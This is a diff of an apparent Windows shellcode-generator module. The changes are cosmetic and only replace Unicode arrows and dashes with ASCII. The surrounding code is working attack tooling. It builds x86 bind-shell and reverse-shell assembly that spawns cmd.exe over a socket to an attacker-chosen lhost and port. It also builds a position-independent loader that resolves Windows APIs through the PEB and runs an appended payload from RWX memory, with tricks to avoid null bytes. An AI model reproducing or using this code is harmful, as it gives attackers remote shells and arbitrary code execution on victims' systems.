@@ -23,7 +23,7 @@ from .snippets  import (
 )
 
 
-# ── Static core blocks ─────────────────────────────────────────────────────────
+# -- Static core blocks ---------------------------------------------------------
 
 _PROLOGUE = """\
 start:
@@ -110,7 +110,7 @@ def _find_function_asm(algo: str, rotation: int) -> str:
     )
 
 
-# ── Resolve block builders ─────────────────────────────────────────────────────
+# -- Resolve block builders -----------------------------------------------------
 
 def build_resolve_block(func_names: list, algo: str, rotation: int,
                         slots: SlotAllocator,
@@ -178,7 +178,7 @@ def build_call_placeholder(func_names: list, slots: SlotAllocator) -> str:
     )
 
 
-# ── Mode builders ──────────────────────────────────────────────────────────────
+# -- Mode builders --------------------------------------------------------------
 
 def custom_code(func_names: list, algo: str = 'ror', rotation: int = 13):
     """
@@ -203,11 +203,11 @@ def bindshell_code(port: int, algo: str = 'ror', rotation: int = 13):
     Full TCP bind shell on *port*.
 
     Assembly flow:
-      prologue → find_kernel32 → find_function
+      prologue -> find_kernel32 -> find_function
       resolve kernel32: TerminateProcess, LoadLibraryA, CreateProcessA
       load + resolve ws2_32: WSAStartup, WSASocketA, bind, listen, accept
-      WSAStartup → WSASocketA → sockaddr_in → bind → listen → accept
-      STARTUPINFOA (socket handles) → cmd.exe → CreateProcessA → TerminateProcess
+      WSAStartup -> WSASocketA -> sockaddr_in -> bind -> listen -> accept
+      STARTUPINFOA (socket handles) -> cmd.exe -> CreateProcessA -> TerminateProcess
 
     Returns (asm_string, SlotAllocator).
     """
@@ -242,11 +242,11 @@ def revshell_code(lhost: str, lport: int, algo: str = 'ror', rotation: int = 13)
     Full TCP reverse shell connecting to *lhost*:*lport*.
 
     Assembly flow:
-      prologue → find_kernel32 → find_function
+      prologue -> find_kernel32 -> find_function
       resolve kernel32: TerminateProcess, LoadLibraryA, CreateProcessA
       load + resolve ws2_32: WSAStartup, WSASocketA, WSAConnect
-      WSAStartup → WSASocketA → WSAConnect(lhost:lport)
-      STARTUPINFOA (socket handles) → cmd.exe → CreateProcessA → TerminateProcess
+      WSAStartup -> WSASocketA -> WSAConnect(lhost:lport)
+      STARTUPINFOA (socket handles) -> cmd.exe -> CreateProcessA -> TerminateProcess
 
     Returns (asm_string, SlotAllocator).
     """
@@ -274,7 +274,7 @@ def revshell_code(lhost: str, lport: int, algo: str = 'ror', rotation: int = 13)
     return '\n'.join(sections), slots
 
 
-# ── PI loader ──────────────────────────────────────────────────────────────────
+# -- PI loader ------------------------------------------------------------------
 
 # Placeholder immediate used in `add ebx, imm32` before patching.
 # Must be > 0x7F to force a 6-byte imm32 encoding (not imm8), keeping the
@@ -288,11 +288,11 @@ def _null_safe_push_imm(val: int, comment: str = '') -> str:
     embedding null bytes in the instruction stream.
 
     Handles the common cases that appear in loader constants:
-      - no nulls              → plain push imm32
-      - three trailing nulls  → xor eax / mov al / push eax
-      - two trailing nulls    → xor eax / mov ax / push eax
-      - one trailing null     → xor eax / 3× (mov al + shl) / push eax
-      - embedded nulls        → warning comment + plain push (manual fix needed)
+      - no nulls              -> plain push imm32
+      - three trailing nulls  -> xor eax / mov al / push eax
+      - two trailing nulls    -> xor eax / mov ax / push eax
+      - one trailing null     -> xor eax / 3x (mov al + shl) / push eax
+      - embedded nulls        -> warning comment + plain push (manual fix needed)
     """
     packed = struct.pack('<I', val & 0xFFFFFFFF)
     b      = list(packed)
@@ -317,7 +317,7 @@ def _null_safe_push_imm(val: int, comment: str = '') -> str:
             '    push  eax',
         ]
     else:
-        return (f'    # WARNING: embedded null in {hex(val)} ({comment}) — manual fix required\n'
+        return (f'    # WARNING: embedded null in {hex(val)} ({comment}) - manual fix required\n'
                 f'    push  {hex(val)}{c}')
     return '\n'.join(lines)
 
@@ -333,7 +333,7 @@ def loader_code(payload: bytes, algo: str = 'ror', rotation: int = 13):
       1. Walks the PEB to find kernel32.dll
       2. Resolves VirtualAlloc, RtlMoveMemory, CreateThread, WaitForSingleObject
       3. Finds the payload address via a call/pop delta (position-independent)
-      4. VirtualAlloc(RWX) → RtlMoveMemory(payload) → CreateThread → WaitForSingleObject
+      4. VirtualAlloc(RWX) -> RtlMoveMemory(payload) -> CreateThread -> WaitForSingleObject
 
     The call/pop delta is computed by a one-pass assemble-then-patch strategy:
       - Assemble with placeholder 0xDEADBEEF in `add ebx, imm32`
@@ -363,7 +363,7 @@ def loader_code(payload: bytes, algo: str = 'ror', rotation: int = 13):
         _find_function_asm(algo, rotation),
         resolve_block,
 
-        # ── call/pop delta — EBX = payload address ──────────────────────────
+        # -- call/pop delta - EBX = payload address --------------------------
         # After `pop ebx`, EBX = runtime address of _get_here.
         # `add ebx, DELTA` advances EBX to the first byte of the appended payload.
         # DELTA = loader_size - offset(_get_here).  Patched after assembly.
@@ -372,9 +372,9 @@ find_payload:
     call  _get_here
 _get_here:
     pop   ebx                        # EBX = runtime addr of this label
-    add   ebx, {hex(_LOADER_DELTA_PLACEHOLDER)}  # PATCHED: delta → payload start""",
+    add   ebx, {hex(_LOADER_DELTA_PLACEHOLDER)}  # PATCHED: delta -> payload start""",
 
-        # ── VirtualAlloc(NULL, payload_size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+        # -- VirtualAlloc(NULL, payload_size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
         # 0x3000 built without null bytes via push/pop/shl.
         # Payload size uses _null_safe_push_imm in case it contains zero bytes.
         f"""\
@@ -390,7 +390,7 @@ call_virtualalloc:
     call  dword ptr [ebp+{hex(va_slot)}]    # VirtualAlloc -> EAX = RWX buffer
     mov   esi, eax                   # ESI = RWX buffer (preserved across calls)""",
 
-        # ── RtlMoveMemory(RWX_buffer, payload_ptr, payload_size)
+        # -- RtlMoveMemory(RWX_buffer, payload_ptr, payload_size)
         f"""\
 call_rtlmovememory:
 {_null_safe_push_imm(payload_size, 'Length = payload size')}
@@ -398,7 +398,7 @@ call_rtlmovememory:
     push  esi                        # Destination = RWX buffer
     call  dword ptr [ebp+{hex(rtl_slot)}]   # RtlMoveMemory""",
 
-        # ── CreateThread(NULL,0,RWX_buffer,NULL,0,NULL) → EAX = thread handle
+        # -- CreateThread(NULL,0,RWX_buffer,NULL,0,NULL) -> EAX = thread handle
         f"""\
 call_createthread:
     xor   ecx, ecx
@@ -410,7 +410,7 @@ call_createthread:
     push  ecx                        # lpThreadAttributes = NULL
     call  dword ptr [ebp+{hex(ct_slot)}]    # CreateThread -> EAX = thread handle""",
 
-        # ── WaitForSingleObject(thread_handle, INFINITE)
+        # -- WaitForSingleObject(thread_handle, INFINITE)
         # 0xffffffff has no null bytes: FF FF FF FF
         f"""\
 call_waitforsingleobject:
@@ -421,13 +421,13 @@ call_waitforsingleobject:
 
     code = '\n'.join(sections)
 
-    # ── Assemble and patch ─────────────────────────────────────────────────────
+    # -- Assemble and patch -----------------------------------------------------
     # Lazy import keeps keystone optional at import time.
     from .assembler import assemble as _asm
     loader_bytes = bytearray(_asm(code)[0])
     loader_size  = len(loader_bytes)
 
-    # Locate `add ebx, 0xDEADBEEF` → encoded as: 81 C3 EF BE AD DE
+    # Locate `add ebx, 0xDEADBEEF` -> encoded as: 81 C3 EF BE AD DE
     marker = bytes([0x81, 0xC3]) + struct.pack('<I', _LOADER_DELTA_PLACEHOLDER)
     pos    = loader_bytes.find(marker)
     if pos == -1:
@@ -439,7 +439,7 @@ call_waitforsingleobject:
     # `pop ebx` is the single byte at pos-1.
     # After pop, EBX = runtime_addr(pos-1) = loader_base + (pos-1).
     # Payload starts at loader_base + loader_size.
-    # → delta = loader_size - (pos - 1) = loader_size - pos + 1
+    # -> delta = loader_size - (pos - 1) = loader_size - pos + 1
     delta = loader_size - pos + 1
     loader_bytes[pos + 2 : pos + 6] = struct.pack('<I', delta)
 
